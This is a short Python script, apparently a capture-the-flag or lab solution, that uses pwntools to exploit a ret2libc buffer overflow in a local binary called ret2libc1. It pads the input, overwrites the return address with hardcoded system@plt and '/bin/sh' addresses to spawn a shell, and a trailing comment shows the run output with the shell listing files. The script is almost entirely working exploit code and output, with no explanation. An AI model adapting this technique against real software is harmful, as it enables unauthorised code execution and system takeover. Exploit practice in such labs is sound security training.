#!/usr/bin/env python
from pwn import *

sh = process('./ret2libc1')

binsh_addr = 0x8048720
system_plt = 0x08048460
payload = flat(['A' * 108, 'B' * 4, system_plt, 'b' * 4, binsh_addr])
sh.sendline(payload)

sh.interactive()

"""
[root@ningan ret2libc1]# python exp.py
[+] Starting local process './ret2libc1': pid 738
[*] Switching to interactive mode
RET2LIBC >_<
$ ls
exp.py    ret2libc1

"""